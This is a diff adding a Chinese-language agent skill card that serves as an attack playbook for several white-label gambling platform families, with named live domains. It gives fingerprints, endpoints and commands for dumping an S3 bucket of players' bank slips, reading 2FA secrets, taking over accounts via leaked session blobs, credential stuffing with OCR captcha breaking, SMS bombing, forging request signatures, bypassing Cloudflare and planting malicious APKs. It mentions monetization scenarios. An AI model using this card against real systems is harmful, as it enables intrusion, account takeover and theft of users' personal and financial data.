@@ -1,0 +1,96 @@
+---
+name: whitelabel-gambling-extra-families
+description: "白标博彩补充家族渗透时使用。触发: daanrox, lsmview, dingyi, nogle, wali。"
+version: 1.0.0
+license: MIT
+
+---
+
+# 白标博彩补充家族 (Extra Whitelabel Gambling Families)
+
+## When to Use
+
+遇到正文顶部触发指纹/关键词时使用本技能(吸收自测绘引擎知识包)。完整卡全文: 镜像 `D:\博彩通杀\技能库\测绘引擎知识包\.cursor\skills\<原名>\SKILL.md`。
+
+
+来源: 测绘引擎知识包吸收。主族(1Z/M8/KK8/mm8bet)见独立技能;本卡覆盖**其余 8 个实测家族**的指纹速查+核心打法。完整卡在镜像 `.cursor\skills\<name>\SKILL.md`。
+
+## 家族速查表(按指纹对号入座)
+
+| 家族 | 触发指纹 | 最快突破口 | 镜像卡 |
+|---|---|---|---|
+| **grape/PK686**(巴基斯坦,idbp11 CDN) | 静态 `sgp5-static.idbp11.com/grapeAppAA/{ver}/assets/`;包 `com.fq.grape.*`(Spring);**CN 数据中心 IP 全锁**(code 10004=ipLimit,需 US/非 CN 出口) | **注册免验证码免短信**(verificationServiceEnum NONE, registerWithMobile)→注册即 token;`Device-Code`=AES-ECB 加密带时间戳**可复用**;RSA 密码密文跨账户复用;代理树接口泄露下线明文手机号;隐藏回调 `api/grape/callback/common/app/valid`=域存活 oracle;App 域 app.pk686app.com | (本家族 2026-09 PK686 实战:444pk686.com_recon) |
+| **daanrox**(巴西/PIX) | 葡语+BRL+`DESENVOLVIDO POR DAANROX`;`__APP_CONFIG__` 超长 domainInfo(b64反转+unquote解密) | **token_user cookie 才是真会话**;写操作必须有 cookie;`user.assets` 明文回显 assetPassword(提现密=登录密);未授权:activity.sharePhone 泄露手机号池 / rank.userRank | daanrox-br-gambling-pentest |
+| **LSM**(泰国,lsmview/mclsm) | 租户子域 `{brand}.l{3-7}t.lsmview.com`;Filament "LSM Auto Accounting" | **S3 mclsm.s3.ap-southeast-1 公开 List/Get/Put**;account/slip/*.jpg 玩家银行凭条+实名;exports/financial_deposits 存款流水;website-settings?sub_domain= 全租户枚举 | lsm-mclsm-gambling-pentest |
+| **dingyi.io**(鼎艺,泰) | Nuxt + `webSdk.produce` + megagw CDN 头 | 注册明文密码无验证码**注册即 token**;google-secret/get 无鉴权返 TOTP URL;pay-channel/info 泄露公司收款户名 | dingyi-whitelabel-gambling-pentest |
+| **Nogle MPS**(Dubai7等) | chunk 名 `nogle_react_boilerplate`;API `{brand}-ecp/api/v1` | `/players/lookup?q=` 未授权用户名枚举;HMAC-SHA1(pwd,key) key 硬编码前端;easyocr 破验证码(~50%) | nogle-mps-pentest |
+| **AKS/GoFun**(n1s168) | AKS包网 + Laravel + `14.128.0.0/24` | **免验证码注册**: dev-api.gofun8.com register_google_verify=false;2fa/take 无验证返 TOTP secret;rank/withdrawal 无鉴权泄露 7747万USDT流水 | aks-gofun-gambling-pentest |
+| **Wali**(瓦力,TG群投) | TG bot 瓦力游戏 + tg1.game + `XOR key [47,85,114,120,3,20,9,77,5,90]` | trial.do 免认证(uid 自增可枚举);XOR 密文 Python 必须用**有符号字节**(Int8Array 坑);真实 token 需 bot 后端 | wali-tg-tma-pentest |
+| **666Bet/JVIP**(TG TMA) | `suid` 65-char base64url;JWT iss=666BetGame;game10.mzbxdt.com | **suid 直登 `/login-tg {suid}` = 账户接管(URL 即会话凭据)**;withdraw/bind/delete 无 payPwd 校验;send/phone/code 无速率 SMS bomb | 666bet-tma-pentest |
+| **M9/HSBox**(m910.vip) | Spring WebFlux `/api/<svc>/*` + X-Sign 头 | X-Sign=MD5(X-UDID+"jgyh,kasd"+ts) 与 body/token 无关可离线伪造;touristLogin 无限游客;setCashPwd 无旧密码校验 | m9-hsbox-gambling-pentest |
+
+## 核心打法摘要
+
+### daanrox(巴西) — 会话层是突破口
+- 登录 `POST /api/frontend/trpc/auth.login` body `{"json":{...}}`(**非 batch!**)→ Set-Cookie `token_user`;引导 `auth.token` → X-Auth-Tag/X-Tag/x-token-data
+- 注册字段必须是 `phone`(非 phoneNumber);CPF 校验位手算;注册即领 awardAmount=3 → balance 300(×100 内部单位)
+- **ROX 遗留面**: `/rox/api/set_ip.php?ip=` 未授权写入(可刷库);源码 github.com/Daanrox/candy-crush-pay 明文 DB 账密
+- 盲区: 新版 PHP 后台 `/admin/login`(email+senha+_csrf)实测打不穿,别重复
+
+### LSM(泰国) — S3 桶是金矿
+```bash
+# S3 分页拉全量(实测 40000 对象)
+curl "https://mclsm.s3.ap-southeast-1.amazonaws.com/?list-type=2&max-keys=1000"
+# 高价值目录: account/slip/*.jpg(玩家银行凭条+实名) / exports/financial_deposits/{merchantId}/*.json(存款流水)
+# Created By/Approved By = 运营审核账号(反推新租户;merchantId 对应: lsmready=434, ahma55=654)
+```
+- 供应链投毒链(已实测被利用过): file_app_apk/ 覆盖=全租户恶意 APK;website_setting/ 替换=XSS;exports/ 伪造=财务污染
+- Filament 后台 curl POST /login=405(Livewire 必须浏览器), 无 register/forgot → 别浪费时间
+
+### dingyi — 注册即登录
+- `POST /api/core/member/frontend/register {"account","password","registerDomain":"https://<site>/"}` → 明文密码,无验证码,注册即返 token
+- 登录加密 Xe: 逐字符 XOR `Je="d1b9e55a0df3a62684167da5dd7a7fea"`(p=ord(pwd[0]), Je[(i+p)%32]) → 拼 xor+p+len → base64
+- 错误码审计: 40000=用户不存在 / 20000=存在但被禁 / 40004=密码错 / 50001=限频
+- google-secret/get 无鉴权 → TOTP URL(2FA secret);pay-channel/info → 公司收款银行户名/卡号
+- 源站绕 CF: 直连源站 IP 带 `Host: <domain>` 头
+
+### Nogle — easyocr 破验证码 + 撞库
+```bash
+# CPU torch 安装(千万别 GPU, 几GB)
+python3 -m venv /tmp/pvenv && /tmp/pvenv/bin/pip install torch --index-url https://download.pytorch.org/whl/cpu
+/tmp/pvenv/bin/pip install easyocr  # Reader(['en'], gpu=False); readtext 用文件路径
+# 登录: HMAC-SHA1(pwd, key), key 硬编码(例 lhGaeLmCJg, 模块51767)
+POST /rc6prod-ecp/api/v1/login {"loginname":u,"loginpassword":HMAC-SHA1(pwd,key),"captcha":c,"captchauuid":uuid,"portalid":"MOBILE"}
+```
+- `/players/lookup?q=` 未授权用户名枚举(精确 oracle)→ 撞库高价值玩家号
+
+### AKS/GoFun — 2FA 密钥直读
+- `POST /api/v1/user/2fa/take` → `{secret, photo}` **无需任何验证**;user/detail 同值泄露
+- 免验证码注册: 目标 `dev-api.gofun8.com` / `api.n1s168.com` register_google_verify=false
+- game/login 参数名是 **game_name**(非 game_code);跨租户 JWT aud 不同(dev 号 prod 无效)
+
+### 666Bet — suid 直登(账户接管通用类)
+```bash
+# ★ 每个 TMA 家族都该测: POST /login-tg {"suid":"<65-char>","pid":10}
+# suid = 48-byte 加密 blob(base64url), 泄露于分享链接/历史/日志 = 全账户接管
+# 已验链: suid→token→/withdraw/bind/delete(无 payPwd)→受害者提现绑定被删
+# 认证头怪癖: "Authorization: <JWT>" 无 Bearer 前缀 + lang: zh 头(缺→code 8)
+```
+- smart-redirect 落地页侦查: config.json domains 数组 + favicon.ico 存活探测(404 也算活)
+
+### M9/HSBox — X-Sign 弱签名
+```
+X-Sign = MD5(X-UDID + "jgyh,kasd" + X-Timestamp_ms)  # 与请求体无关!
+# 必需头: X-UDID / X-Timestamp / X-Sign / X-Language: zh-CN / tenantSys / domainName / os(必须数字!)
+POST /api/user/sys/auth/touristLogin {"udid":"<any>"} → 无限游客(token 短时,每轮前刷新)
+POST /api/user/sys/user/setCashPwd {"password":"<6位>"} → 无旧密码校验
+```
+
+## Pitfalls
+- daanrox 全家同后端: 在 h57vip/265br 等站调共享数据可绕 188world region 墙
+- LSM S3 写权限测完立即 DELETE 清理;桶内已有 FORCEINJECT*.json 历史攻击痕迹
+- 泰系家族验证码/OTP 服务端校验+限流是常态,别死磕注册,走免验证码入口或弱口令
+- 所有家族: 前端 JS chunk = API 端点金矿,先 grep `https://` 找真 API 域再动手
+
+## 完整情报
+各家族完整端点表/密钥/变现场景 → 镜像 `D:\博彩通杀\技能库\测绘引擎知识包\.cursor\skills\<上表镜像卡>\SKILL.md`
